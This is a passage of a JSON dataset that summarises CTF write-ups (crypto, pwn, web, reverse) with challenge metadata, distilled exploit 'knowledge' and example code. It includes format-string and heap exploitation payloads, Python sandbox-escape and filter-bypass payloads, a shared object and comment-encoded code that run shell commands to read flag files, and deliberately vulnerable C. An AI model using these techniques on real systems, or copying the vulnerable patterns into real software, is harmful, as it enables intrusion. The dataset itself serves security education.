encrypt(plaintext, key, polybius_square)\ndecrypted_text = decrypt(ciphertext, key, polybius_square)\n\nprint(\"Ciphertext:\", ciphertext)\nprint(\"Decrypted text:\", decrypted_text)\n```\n"
    },
    {
        "name": "The oracle",
        "write_up": "dataset/raw/The oracle.md",
        "type": "crypto",
        "competition": [
            "Hero/2022",
            "https://ctftime.org/event/1663/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "When decrypting text encrypted with a substitution cipher, identifying and replacing the most frequently occurring characters with common symbols or letters (e.g., space, 'e') can provide initial clues towards deciphering. This method hinges on the assumption that certain characters or symbols appear more commonly in the given language of the encrypted text. Start by replacing the most common character with a space ('0x20') if dealing with hex-encoded binary or textual data, as spaces are often the most common in English plaintext.",
            "For complex substitution ciphers where direct cribs (expected words or sequences) do not work due to the cipher's composition or the text not containing anticipated common words, employing frequency analysis and interactive decoding tools can effectively deduce the cipher. This involves mapping out character frequencies within the encrypted message and methodically substituting them based on their frequency of occurrence compared to known frequency distributions in the target language. Tools or scripts that allow for the interactive replacement and immediate feedback on the decryption progress can significantly speed up this process, especially in formats where there are numerous distinct values or characters beyond standard alphabetic substitution."
        ],
        "key": "```python\ndef substitution_cipher(text, key):\n    result = \"\"\n    for char in text:\n        if char in key:\n            result += key[char]\n        else:\n            result += char\n    return result\n\n# Example of a vulnerable substitution cipher\ncipher_text = \"???? ????????????? ???? ??? ?? ???? ???? ??? ???????? ???? ??? ???? ?? ????? ????? ????? ??? ????????? ???? ???????? ?????????? ?????? ??????? ?? ????? ???????????? ??? ???? ????? ??????? ???????\"\nkey = {\n    '?': 'e',  # Example substitution\n    # Add more substitutions as needed\n}\n\n# Decrypting the cipher text\nplain_text = substitution_cipher(cipher_text, key)\nprint(plain_text)\n```\n"
    },
    {
        "name": "The Order of the Phoenix",
        "write_up": "dataset/raw/The Order of the Phoenix.md",
        "type": "The type of the challenge is **crypto**.",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When faced with a challenge that suggests the need for a threshold number of keys or secrets to retrieve information, consider the application of Shamir's Secret Sharing method. This cryptographic approach divides a secret into parts, where a certain number of parts are required to reconstruct the original secret. This is particularly useful in scenarios where distributing trust or responsibility among multiple parties is necessary.",
            "For efficiently decoding multiple QR codes in Python, the `pyzbar` library can be utilized in conjunction with the `PIL` (Pillow) library. This combination allows for the batch processing of images to extract encoded information. This approach is not only limited to CTF challenges involving QR codes but can also be applied to any task requiring the automation of QR code data extraction.\n\nExample code snippet for decoding QR codes:\n```python\nfrom PIL import Image  \nfrom pyzbar.pyzbar import decode\n\nnamelist = ['name1', 'name2', 'name3']  # Sample list of image file names representing QR codes\n\nfor name in namelist:  \n    qr = Image.open(f'{name}.png')  # Open the image file for the current name\n    qr_data = decode(qr)[0][0].decode()  # Decode the QR code and convert the data to a string\n    print(qr_data)  # Print out the data from the QR code\n```"
        ],
        "key": "```python\ndef check_access(members):\n    if len(members) < 5:\n        return \"Access Denied\"\n    else:\n        return \"Access Granted\"\n\n# Example usage\nmembers = ['Harry', 'Hermione', 'Ron']\nprint(check_access(members))  # Access Denied\n\nmembers = ['Harry', 'Hermione', 'Ron', 'George', 'Charlie']\nprint(check_access(members))  # Access Granted\n```"
    },
    {
        "name": "The Pwn Inn",
        "write_up": "dataset/raw/The Pwn Inn.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 477,
        "max_score": 1000,
        "difficulty": 0.477,
        "knowledge": [
            "When encountering a format string vulnerability in a 64-bit dynamically linked executable that is not stripped, and has Partial RELRO and NO PIE protections, one can use the vulnerability to write arbitrary data to specific memory locations. This can be exploited by overwriting the Global Offset Table (GOT) entries of critical functions like `exit()` to redirect code execution flow to functions beneficial for an attacker, such as a vulnerability function that may allow repeated exploitation or a shell spawning function.",
            "To leverage a format string vulnerability for leaking memory addresses and defeating Address Space Layout Randomization (ASLR), one can read out the GOT entries of functions like `puts` to leak libc addresses. With the libc address leaked, it's possible to calculate the address of system-critical functions like `system` by finding their offsets online. Once the address of `system` is known, GOT entries of a function that processes user-controlled input, such as `printf`, can be overwritten to redirect executions to `system`, allowing execution of arbitrary commands.\n   \nExample payload to redirect `printf`'s GOT entry to `system`: `%<offset_to_vuln_function>$n%<offset_to_puts_got_entry>$s`"
        ],
        "key": "```c\n#include <stdio.h>\n\nvoid vuln() {\n    char buffer[64];\n    printf(\"Enter your input: \");\n    gets(buffer); // Vulnerable to buffer overflow\n    printf(buffer); // Vulnerable to format string attack\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n```"
    },
    {
        "name": "The Show Must Go On",
        "write_up": "dataset/raw/The Show Must Go On.md",
        "type": "pwn",
        "competition": [
            "UMDCTF/2022",
            "https://ctftime.org/event/1593/tasks/"
        ],
        "score": 808,
        "max_score": 987,
        "difficulty": 0.8186423505572442,
        "knowledge": [
            "When facing a Buffer OverFlow (BOF) challenge involving dynamic memory allocation on the heap, if there's an `fgets` call that reads a user-controllable amount more data than the allocated buffer size, this discrepancy can be leveraged to overwrite nearby heap memory or structures. This is particularly exploitable when the memory layout is predictable, for example, if the allocations and frees are performed in a certain order that makes a critical structure (like a function pointer) a neighbor of the overflowable buffer. The strategy is to calculate the payload size needed to reach the target structure from the buffer. It is necessary to consider the size of the buffer, any metadata (like the heap's metadata structures), and the offset to the target structure.\n\nExample Payload Calculation:\n```python\nbuffer_size = user_controlled_size # Size up to which data can be read by fgets\nheap_structure_size = 16 # Hypothetical size of heap's metadata structure between buffers\noffset_to_target = 0x60 # Offset from the start of the overflow buffer to the target structure\npayload_size = buffer_size + heap_structure_size + offset_to_target\npayload = (payload_size * b\"A\") + p64(address_of_target_function)\n```",
            "In scenarios involving exploiting heap-based vulnerabilities to achieve Remote Code Execution (RCE), if the binary has a function that can lead to winning conditions (e.g., printing a flag), but there's no direct call to this function in the normal program flow, modifying a function pointer on the heap to point to this 'win' function can achieve the desired outcome. This technique is particularly useful in challenges where the memory layout or certain patterns of allocation and deallocation can lead the exploit developer to control the content of a function pointer. A critical step here is to ensure the payload properly aligns the 'win' function's address with the corrupted function pointer's memory location. If the binary is not compiled with Position Independent Executable (PIE), absolute addresses can be used directly in the payload.\n\nExample Payload to Overwrite Function Pointer:\n```python\nwin_function_address = p64(binary.sym.win) # Use p64 for 64-bit binaries\n# Constructing the payload. Note: 'A'*240 represents the calculated number of bytes to reach the function pointer.\npayload = b'A' * 240 + win_function_address\n```"
        ],
        "key": "```c\nputs(\"How long do you want the show description to be?\");  \n__isoc99_scanf(&DAT_004bb2a2,&local_44);  \nshowDescription = (char *)malloc_set((long)(local_44 + 8));  \nputs(\"Describe the show for us:\");  \ngetchar();  \nfgets(showDescription,500,(FILE *)stdin);\n```"
    },
    {
        "name": "the-substitution-game",
        "write_up": "dataset/raw/the-substitution-game.md",
        "type": "misc",
        "competition": [
            "redpwn/2021",
            "https://ctftime.org/event/1327/tasks/"
        ],
        "score": 145,
        "max_score": 481,
        "difficulty": 0.30145530145530147,
        "knowledge": [
            "When dealing with string manipulations in CTF challenges, especially where transformations are based on applied rules one after another, leveraging Python's `str.replace()` method can effectively automate the process of changing initial strings to target strings. This method applies all instances of the replacement at once, an important factor to consider when planning transformations to reach a desired output. Crafting the sequence of replacement rules carefully can solve complex transformation challenges.\n\nExample payload for string shortening:\n```\naa => a\naaa => a\n```",
            "In scenarios involving pattern recognition or calculation simulations with strings (such as detecting palindromes or performing binary addition), constructing an incremental replacement strategy that simulates the logical steps or checks of the operation can lead to solutions for seemingly complex problems. This involves breaking down the problem into smaller, manageable operations that can be represented as string replacements. For palindromes, manipulating markers towards the center, and for binary addition, sequentially aligning and adding least significant digits can systematically solve the problems.\n\nExample payload for shifting markers towards the center in a palindrome check:\n```\n^0 => 0^z\n0$ => z$0\n^1 => 1^z\n1$ => z$1\nz => \n```"
        ],
        "key": "```python\n# Example of a vulnerable code snippet based on the context\ndef apply_replacement_rules(initial_string, rules):\n    for old, new in rules:\n        initial_string = initial_string.replace(old, new)\n    return initial_string\n\n# Example usage\ninitial_string = \"aaaaQQaa\"\nrules = [(\"aa\", \"a\"), (\"a\", \"c\")]\nresult = apply_replacement_rules(initial_string, rules)\nprint(result)  # Output: cQQc\n```"
    },
    {
        "name": "TheHiddenOne",
        "write_up": "dataset/raw/TheHiddenOne.md",
        "type": "web",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 249,
        "max_score": 500,
        "difficulty": 0.498,
        "knowledge": [
            "In challenges where code execution is constrained by specific patterns or regex validations, look for known features or workarounds within the language being used that could be exploited to bypass these restrictions. Specifically, for Python, you can use the `# coding: raw_unicode_escape` directive to encode arbitrary Python code in Unicode escape sequences. This encodes a newline as `\\u000a`, allowing for the execution of Python code hidden within comments that pass regex validations targeting comment lines. Example payload: \n   ```python\n   # coding: raw_unicode_escape  \n   #\\u000aimport os  \n   #\\u000aos.system(\"ls -laF\")  \n   #\\u000aos.system(\"cat *flag*\")\n   ```",
            "In challenges involving file uploads and subsequent code execution, if the scenario suggests inspecting behavior of utilities like `cat`, investigate less known features of these utilities as they might hint at bypass techniques. For instance, the `-v` option in `cat` showcases handling of unprintable characters, hinting that solutions might involve ASCII control codes to evade regex validations or alter file interpretation. Though specific payloads exploiting `cat -v` were not directly mentioned, the knowledge implies scrutinizing and utilizing command-line utility options (such as `-v` for `cat`) could provide alternate exploitation paths when facing validation or execution constraints."
        ],
        "key": "```python  \n# coding: raw_unicode_escape  \n#\\u000aimport os  \n#\\u000aos.system(\"ls -laF\")  \n#\\u000aos.system(\"cat *flag*\")  \n```"
    },
    {
        "name": "There is a bug",
        "write_up": "dataset/raw/There is a bug.md",
        "type": "The type of challenge in this write-up is reverse.",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When encountering a challenge that involves a bug in app development, particularly in Android applications, it is possible to decompile the app, inspect the code, and manually insert missing functionality. Specifically, if a function call is missing in the code, one can add the necessary smali code to invoke this function properly. This often requires understanding of the parameters the function expects and ensuring they are passed in the correct order.",
            "Beyond manual code manipulation, dynamic instrumentation tools like Frida can be used to directly invoke functions within the app. This approach is beneficial when the objective is to interact with specific functionality without modifying the app's codebase. Execution via Frida demands constructing the required parameters accurately to successfully call the method and obtain desired outcomes. \n\nExample payload for manual insertion (smali code):\n```smali\ninvoke-virtual {p0, v0, v1, p0, v3}, Lcom/example/authenticator/MainActivity;->getFlag(Landroid/widget/TextView;Landroid/widget/EditText;Landroid/content/Context;Landroid/content/SharedPreferences;)Ljava/lang/String;\nmove-result-object v5\n```"
        ],
        "key": "```java\npublic class MainActivity extends AppCompatActivity {\n    private TextView resultTextView;\n    private EditText passwordEditText;\n    private SharedPreferences sharedPreferences;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        resultTextView = findViewById(R.id.resultTextView);\n        passwordEditText = findViewById(R.id.passwordEditText);\n        sharedPreferences = getSharedPreferences(\"app_prefs\", MODE_PRIVATE);\n\n        // Missing function call\n        // String result = getFlag(resultTextView, passwordEditText, this, sharedPreferences);\n        // resultTextView.setText(result);\n    }\n\n    private String getFlag(TextView textView, EditText editText, Context context, SharedPreferences prefs) {\n        // Vulnerable code that processes the password and returns the flag\n        String password = editText.getText().toString();\n        if (password.equals(\"correct_password\")) {\n            return \"FLAG{example_flag}\";\n        } else {\n            return \"Incorrect password\";\n        }\n    }\n}\n```"
    },
    {
        "name": "theyseemerolling",
        "write_up": "dataset/raw/theyseemerolling.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 50,
        "max_score": 700,
        "difficulty": 0.07142857142857142,
        "knowledge": [
            "In a challenge involving custom encryption algorithms, particularly where an algorithm uses a predictable pattern in its key (e.g., starting with a known string), one can recover parts of the encryption key by XORing the known plaintext with the corresponding ciphertext segment. This method is especially useful when the encryption mechanism prepends known or predictable data to each block, allowing for parts of the key to be deduced independent of the rest of the ciphertext.  \n   Example scenario: If a custom encryption algorithm prepends a predictable value like 'wctf{' to the encrypted data, and this predictable value can be associated with the beginning of the ciphertext, then XORing 'wctf' with the first bytes of the ciphertext can reveal the lower 4 bytes of the encryption key.  \n   Example payload: If the first block of ciphertext is `98bf...` and known plaintext starts with `wctf`, then XOR('wctf', '98bf...') can help recover the lower parts of the encryption key.",
            "In scenarios where the encryption key is partially known or predictable, tools like CyberChef can be employed to automate the decryption process, using a combination of its built-in operations such as XOR and From Hex. This approach is effective for decrypting partially known key cryptographic challenges, particularly when the structure of the ciphertext or the encryption process contains identifiable patterns that can be exploited.  \n   Example scenario: Given a ciphertext and a knowledge that the encryption used an 8-byte key with the lower 4 bytes being deducible from the ciphertext by XORing with a known plaintext sequence, one can utilize CyberChef to automate decryption by applying XOR with the recovered key parts over the ciphertext.  \n   Example CyberChef recipe: The recipe would typically involve converting the ciphertext from hex, XORing with the known or partially recovered key, and possibly cleaning up the output to reveal the plaintext or flag."
        ],
        "key": "```python\nimport os\n\ndef encrypt(plaintext):\n    key = os.urandom(8)\n    padded_plaintext = plaintext + b'\\x00' * ((len(plaintext) % 4) * 4 + 4 - len(plaintext))\n    ciphertext = b''\n    for i in range(0, len(padded_plaintext), 4):\n        block = padded_plaintext[i:i+4]\n        index = i.to_bytes(4, 'big')\n        encrypted_block = bytes([b ^ k for b, k in zip(block, key)])\n        ciphertext += index + encrypted_block\n    return ciphertext\n```"
    },
    {
        "name": "THREE LITTLE KEYS",
        "write_up": "dataset/raw/THREE LITTLE KEYS.md",
        "type": "reverse",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 474,
        "max_score": 960,
        "difficulty": 0.49375,
        "knowledge": [
            "When dealing with randomness in applications, especially for generating keys or seeds, if the seed value is hard-coded or predictable, the output can be replicated. This allows an attacker to generate the same sequence of values that the application generates. Example in Java for a predictable seed: \n```java\nString key = Integer.toString(new Random(3762).nextInt(8000));\n```",
            "For encrypted data that requires a correct key to decrypt, if the application logic or decryption key involves specific patterns or conditions (like specific byte values, string patterns, etc.), writing a brute-force script to generate combinations that meet these patterns and trying each combination can successfully find the correct key. Such a script will iterate through possible values, applying the conditions to generate potential keys, and use them in an attempt to decrypt the data. The procedure involves identifying the pattern or conditions required for the key, generating keys that adhere to this pattern, and attempting decryption with each key until the correct one is found.\nExample condition: Key must match regex `\\d{2}[*!=()%?$#]\\p{Upper}\\d+!` and specific characters must match or fulfill certain conditions.\n```java\npublic static void openLock() {  \n   // Assume str, str2, str3 are parts of the key or relevant data\n   String str = \"7765\"; // Part of key or a hint from analysis\n   String str2 = \"6c6f7665\"; // Another part of key or a hint\n   String string = \"2a\"; // Additional data or part of the composite key\n\n   // Brute-force loop to try different combinations\n   for (int i = 0; i < 10; i++) {  \n       for (int ii = 0; ii < 10; ii++) {  \n           for (String e : \"*!=()%?$#\".split(\"\")) {  \n               for (String f : \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\".split(\"\")) {  \n                   for (int iii = 0; iii < 10; iii++) {  \n                       String str3 = \"\" + i + \"\" + ii + e + f + \"\" + ii + \"\" + iii + \"\" + i+\"!\";  \n                       // Composite key generation and attempt to use it for decryption\n                       // ...\n                   }  \n               }  \n           }  \n       }  \n   }  \n}  \n```"
        ],
        "key": "```java  \npublic static void openLock() {  \n   String str = \"7765\";  \n   String str2 = \"6c6f7665\";  \n   String str3 = \"12*A221!\"; // Bruteforce  \n   String string = \"2a\";  \n   for (int i = 0; i < 10; i++) {  \n       for (int ii = 0; ii < 10; ii++) {  \n           for (String e : \"*!=()%?$#\".split(\"\")) {  \n               for (String f : \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\".split(\"\")) {  \n                   for (int iii = 0; iii < 10; iii++) {  \n                       str3 = \"\" + i + \"\" + ii + e + f + \"\" + ii + \"\" + iii + \"\" + i+\"!\";  \n                       byte[] a2 = a(str + string + str2 + string);  \n                       byte[] bytes = str3.getBytes();  \n                       byte[] bArr = new byte[(a2.length + bytes.length)];  \n                       System.arraycopy(a2, 0, bArr, 0, a2.length);  \n                       System.arraycopy(bytes, 0, bArr, a2.length, bytes.length);  \n                       SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");  \n                       try {  \n                           byte[] bArr2 = FLAG;  \n                           Cipher instance = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");  \n                           instance.init(2, secretKeySpec);  \n                           if(new String(instance.doFinal(bArr2), StandardCharsets.UTF_8).startsWith(\"CSR\")){  \n                               System.out.println(new String(instance.doFinal(bArr2), StandardCharsets.UTF_8) + \" with keys: \\n1. \"+str+\"\\n2. \"+str2+\"\\n3. \"+str3);  \n                           }  \n                       } catch (Exception ex) {  \n                       }  \n                   }  \n               }  \n           }  \n       }  \n   }  \n}  \n```"
    },
    {
        "name": "Thunderbolt",
        "write_up": "dataset/raw/Thunderbolt.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When interacting with encryption services in CTF challenges, try issuing inputs of varying lengths to detect pattern changes or anomalies in the encrypted output. This approach can reveal hidden data or hints towards the solution, especially when extending the input leads to visible repetitions or appended data that looks like hex-encoded strings.",
            "In scenarios where encrypted data seems to contain parts of a flag or recognizable patterns following long inputs, progressively increasing the input size may fully reveal hidden or truncated data. This strategy is particularly useful when you notice partial, corrupted, or hex-encoded flag patterns in the service's response, suggesting that the correct or complete data might only be disclosed with sufficiently large input sizes."
        ],
        "key": "```python\ndef encrypt(input_string):\n    # Vulnerable encryption function\n    encrypted = \"\"\n    for char in input_string:\n        # Simple XOR with a constant key (vulnerable to known-plaintext attacks)\n        encrypted += chr(ord(char) ^ 0x41)\n    return encrypted\n\n# Example usage\nuser_input = input(\"Enter a string to encrypt: \")\nprint(encrypt(user_input))\n```"
    },
    {
        "name": "TI-1337 Plus CE",
        "write_up": "dataset/raw/TI-1337 Plus CE.md",
        "type": "misc",
        "competition": [
            "DiceCTF/2021",
            "https://ctftime.org/event/1236/tasks/"
        ],
        "score": 378,
        "max_score": 500,
        "difficulty": 0.756,
        "knowledge": [
            "For challenges involving restrictions on variable names or global operations in Python, specially crafted payloads that avoid using names beginning with an underscore or global operations directly can circumvent these filters. One technique entails leveraging `IMPORT_FROM` opcode (which behaves similarly to `LOAD_ATTR`) to extract and utilize Python internals or bypass restrictions cleverly by manipulating objects within allowed namespaces.",
            "In scenarios where code execution is filtered or restricted within a Python environment, utilizing C extensions (.so files) or creatively manipulating bytecode in .pyc files provides an alternative avenue for executing arbitrary code. This approach involves generating a shared object file that performs the desired operation (such as reading a flag file) and importing it into the Python script or carefully crafting a .pyc file that bypasses opcode filters to achieve code execution. One inventive usage of this method includes creating a .pyc file with marshalled bytecode that exploits unexpected behavior in Python's unmarshalling process to leak secrets or directly invoke system commands.\n   \n   Example of creating a shared object for arbitrary code execution:\n   ```\n   // pwn.c\n   void PyInit_pwn() {\n     system(\"cat /flag.*.txt\");\n     exit(0);\n   }\n   // Compile with: gcc pwn.c -shared -o pwn.so\n   ```\n\n   For .pyc manipulation, it involves deep understanding of Python internals and crafting .pyc files that adhere to UTF-8 encoding rules but contain bytecode sequences that lead to arbitrary code execution. This process is highly specific and complex, involving meticulous bytecode editing to adhere to Python's execution and encoding constraints, and thus, hard to generalize into a simple example."
        ],
        "key": "```c\ncase LOAD_NAME:  \ncase STORE_NAME:  \ncase DELETE_NAME:  \ncase LOAD_GLOBAL:  \ncase STORE_GLOBAL:  \ncase DELETE_GLOBAL:  \n   if (PyUnicode_AsUTF8(GETITEM(names, oparg))[0] == '_') exit(1);  \n```"
    },
    {
        "name": "TI-1337",
        "write_up": "dataset/raw/TI-1337.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "To bypass input filters or character blacklists in CTF challenges involving code execution, utilize alternative Python syntax structures that are not restricted by the filter. For example, class definitions and decorators can execute functions without using forbidden characters like parentheses or specific symbols, which are commonly blocked to prevent direct function calls or attribute access.\n   \n   Example payload part:\n   ```python  \n   @chr\n   @len\n   @str\n   class c{'1'*(x-0x14)}:pass\n   ```",
            "For challenges that require crafting payloads without certain characters (e.g., uppercase letters, special symbols), a creative approach is to encode the payload using allowed characters only, such as lowercase letters or numbers. This can be achieved by generating classes or variables with names of varying lengths to represent different character codes, and then converting these back into the required characters.\n\n   Example payload part for constructing a string to execute arbitrary code:\n   ```python\n   payload = 'print(open(\"flag.txt\").read())'\n   for i in map(ord, set(payload)):\n       print(export(i))\n   \n   print('fff=lambda x:' + '+'.join(encode(payload)))\n   print('@eval')\n   print('@fff')\n   print('class d:pass')\n   ```"
        ],
        "key": "```python\n#!/usr/bin/env python3  \ndel __builtins__.__import__  \n__builtins__.print(\"Welcome to the TI-1337! You can use any math operation and\nvariables with a-z.\")  \n_c = \"\"  \n_l = __builtins__.input(\"> \")  \nwhile _l != \"\":  \n   # division -> floor division  \n   _l = _l.replace(\"/\", \"//\")  \n   _c += _l+\"\\n\"  \n   _l = __builtins__.input(\"> \")  \n_v = {}  \n_v = __builtins__.set(__builtins__.dir())  \n__builtins__.exec(_c)  \nfor _var in __builtins__.set(__builtins__.dir())-_v:  \n   __builtins__.print(_var, \"=\", __builtins__.vars()[_var])  \n```"
    },
    {
        "name": "Tic Tac Toe",
        "write_up": "dataset/raw/Tic Tac Toe.md",
        "type": "reverse",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 991,
        "max_score": 998,
        "difficulty": 0.9929859719438878,
        "knowledge": [
            "In challenges involving format string vulnerabilities, using specific format string tokens combined with direct memory address referencing enables the modification of program behavior or variables. For a scenario requiring altering a game's logic to always win (or to change difficulty settings, AI behavior, etc.), one can directly write to a memory address that influences that logic. This can be achieved by constructing a payload that combines a number of printed characters (`%<number>c`) with the directive to write the number of printed characters to a memory address (`%<position>$hn`), followed by the actual target memory address. \nExample payload: `%7561c%10$hn` followed by the memory address, e.g., `p64(0x603010)`",
            "In binary exploitation challenges where PIE (Position Independent Executables) is enabled, which means addresses are randomized, consider scenarios where only partial overwrites of certain memory addresses (such as return addresses) are necessary. This can be particularly powerful if the target function's address only differs by a few bytes from the return address on the stack. Leveraging a buffer overflow vulnerability to perform a partial overwrite of the return address to redirect execution flow to a desirable function within the binary (such as a win function) can be an effective strategy. Ensure that the payload adjusts a counter or buffer length in such a way that the overwrite occurs exactly at the desired offset.\nExample payload: A sequence of 'bad characters' (non-newline) followed by a specific byte (`'\\x12'`) that targets the stack-based counter variable to precisely overwrite a return address' least significant byte, e.g., to call a `win` function."
        ],
        "key": "```c\n//Useless function when you think about it, because it's impossible to get here... Right?\nvoid win(){  \n\tint fd;  \n\tchar buffer[100];  \n\tfd = open(\"./flag.txt\",0);  \n\tread(fd, buffer,100);  \n\twrite(1,buffer,100);  \n\t_exit(0);  \n}\n\nint read_board(){  \n\tchar board[3][3];  \n\tchar counter = 0;\n\n\t//read the board in  \n\twhile (counter < 9){  \n\t\twhile(1){  \n\t\t\tread(0, (char*)board+counter++, 1);\n\n\t\t\tif (*((char *)board+counter-1) == '\\n')  \n\t\t\t{  \n\t\t\t\tcounter--;  \n\t\t\t\tcontinue;  \n\t\t\t}  \n\t\t\t//checks for the last character to be o,O,0,x,X   \n\t\t\t//I was a bit lazy in the checks though, so you need to be consistant when using characters  \n\t\t\t//Or the program won't match correctly  \n\t\t\tif (*((char*)board + counter-1) == 'o' || *((char*)board + counter-1) == 'O' ||*((char*)board + counter-1) == '0' || *((char*)board + counter-1) == 'x' || *((char*)board + counter-1) == 'X'){  \n\t\t\t\tbreak;  \n\t\t\t}  \n\t\t\tputs(\"Bad Character, try again\");  \n\t\t}  \n\t}  \n}\n```"
    },
    {
        "name": "TicTacToe",
        "write_up": "dataset/raw/TicTacToe.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2021",
            "https://ctftime.org/event/1320/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "For challenges leveraging insecure deserialization vulnerabilities, particularly with pickle in Python, an attacker can manipulate serialized data to achieve arbitrary code execution or alter application logic. After obtaining a serialized object, one can modify it to change the application's behavior to their advantage, such as artificially inflating win counters or bypassing security checks.",
            "In scenarios where an application uses a hash to validate data integrity or security (e.g., ensuring that winning counts haven't been tampered with), it's possible to bypass this mechanism if the hash generation relies on predictable or accessible data. By understanding how the hash is generated (e.g., combining a known variable with a secret), an attacker can reconstruct a valid hash for manipulated data, as long as they can control or predict the inputs to the hash function."
        ],
        "key": "```python\ndef get_hash(w):  \n    m = sha256()  \n    m.update((str(wins) + flag).encode())  \n    return base64.b64encode(m.digest()).decode()  \n```"
    },
    {
        "name": "tigress",
        "write_up": "dataset/raw/tigress.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "UTCTF/2020",
            "https://ctftime.org/event/929/tasks/"
        ],
        "score": 1981,
        "max_score": 1991,
        "difficulty": 0.9949773982923155,
        "knowledge": [
            "In a challenge involving a virtual machine or any form of obfuscated code execution, hardware breakpoints (hw bp) can be used effectively to trace how user input or other specific data is accessed and manipulated throughout the execution. This is especially useful when dealing with encrypted or obfuscated inputs where the obfuscation or encryption process needs to be understood. Setting breakpoints on specific handlers such as \"get_byte\" or \"xor\" can reveal the operations performed on the input data.",
            "When faced with an obfuscated code challenge that involves bitwise operations such as XOR on the user input, a possible approach to deduce the original input or key values is to use constraint solvers like Z3. By modeling the known operations and their results as constraints (e.g., input XOR key = result), the solver can be used to find possible values of the original input or keys that satisfy all given constraints. This method is particularly useful when the direct analysis of the obfuscation logic is too complex or not feasible.\n\nExample of modeling constraints with Z3:\n```python\nfrom z3 import BitVec, Solver, Or\n\nflag_len = len(magics)  # Assuming magics contain (XOR operand, result) tuples\ns = Solver()\n\nfor i in range(flag_len):\n    input_byte = BitVec(f'b{i}', 8)  # Symbolic variable for input byte\n    xor_operand, xor_result = magics[i]\n    # Adding constraints: input byte should be printable and satisfy the XOR operation\n    s.add(input_byte >= 32, input_byte <= 127, input_byte ^ xor_operand == xor_result)\n```"
        ],
        "key": "```c\nint main(int a1, char **a2, char **a3)  \n{  \n char **v4;  \n char input;  \n unsigned __int64 v6;\n\n v4 = a3;  \n v6 = __readfsqword(0x28u);  \n sub_5631FFB89F3C();  \n dword_5631FFD8EB70 = a1;  \n qword_5631FFD8EB60 = (__int64)a2;  \n qword_5631FFD8EBB0 = (__int64)v4;  \n printf(\"enter the flag: \");  \n __isoc99_scanf(\"%300s\", &input);  \n virtual_machine(input);  \n return 0LL;  \n}  \n```"
    },
    {
        "name": "Tik tok",
        "write_up": "dataset/raw/Tik tok.md",
        "type": "pwn",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting heap-based vulnerabilities, if a program allows for manipulation of file descriptors (FD) by overflowing non-null terminated arrays or strings, one can potentially force a file descriptor to be 0 (standard input, stdin). This method can enable reading from stdin in functions meant to read from files, allowing controlled input to overflow and manipulate heap structures. A technique to achieve this involves sending a payload to fill a buffer and include the file descriptor within the non-null terminated path, exploiting the program's behavior to overwrite the delimiter with a null byte, effectively turning a part of the buffer into a file descriptor.\n\n    - Sample payload construction method:\n    ```python\n    def add_song(path):\n        send(\"1\")  # Option to add a song\n        send(path)  # Send the path that overflows and manipulates the file descriptor\n\n    for i in range(initial_fd, target_fd_character_ascii):\n        add_song(\"valid/song/path.txt\")\n    add_song(\"OverflowingPath\" + \"/\" * (buffer_size - len(\"OverflowingPath\")))\n    ```",
            "Utilizing tcache poisoning for arbitrary memory write in a heap exploitation scenario requires manipulating the tcache (thread's cache) linked list to point to a desired memory address. This can be done by overflowing the heap to overwrite a freed chunk\u2019s FD (forward pointer) in the tcache with an arbitrary address. Subsequently, allocating a new chunk of the appropriate size will return a pointer to the arbitrary address, achieving controlled writing. It is essential to first understand the binary's heap management to set up the heap layout adequately and perform necessary allocations and deallocations to position the chunks for overflow and poisoning.\n\n    - Example approach to overwrite `__free_hook`:\n    ```python\n    def play_and_free_song(index, data):\n        play_song(index)  # Trigger overflow\n        send(data)  # Send payload that overflows into tcache FD\n        free_song(index)  # Free the song to add it to tcache\n\n    play_and_free_song(target_song_index, payload_to_overflow_tcache_fd_with_target_address)\n    allocate_song(size, \"data\")  # Allocate to consume the poisoned tcache chunk, effectively writing to the arbitrary address\n    ```"
        ],
